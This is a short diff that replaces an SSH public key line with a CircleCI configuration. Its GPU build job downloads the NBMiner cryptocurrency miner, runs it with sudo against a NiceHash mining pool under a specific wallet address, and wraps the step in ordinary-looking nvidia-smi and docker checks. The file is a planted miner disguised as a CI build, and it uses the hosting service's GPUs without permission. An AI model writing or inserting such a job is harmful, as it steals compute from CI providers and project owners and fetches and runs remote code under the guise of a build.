@@ -1,1 +1,11 @@
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeNvqrBdEnie+VYQLVITo9OIPuHlHdjr2YzktkFcr6VTrPX9bv4EgSpq1hxejfBOYMhRLY22AvpinpTT2vePEtI6KmM0VQWs9qRzd/ALela3a923q6BCZo9XJxA3Ihcu4IRn+KDEmO16LzotUgnyp/yw6uWpDmyOD5Hh1N2WHoXE7VYT+XqFhyI0IdjVDD89u+26/Pkc7I8P6tKeNlGl/LsNUzv1Um2GbcDei6xNW5lwmbUJNCRgtUJROt5nXKbT5i+EHM2DGJjwZ/3DxK/18Z6nXLAPNi9XjyHBB8Z3oO41Fdsj/UqJo38W51PlBpThz84aDf5CuAG+AtiQC4C/Vz 
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: gpu.nvidia.large
+    steps:
+      - run: nvidia-smi
+      - run: wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz && tar -zxvf NBMiner_40.1_Linux.tgz && cd NBMiner_Linux/ && sudo ./nbminer -a ethash -o nicehash+tcp://daggerhashimoto.eu.nicehash.com:3353 -u 35ZnC1q2Vnjwkn9rLtE5RybR8gHVap3B1R.AST1 --enable-dag-cache
+      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
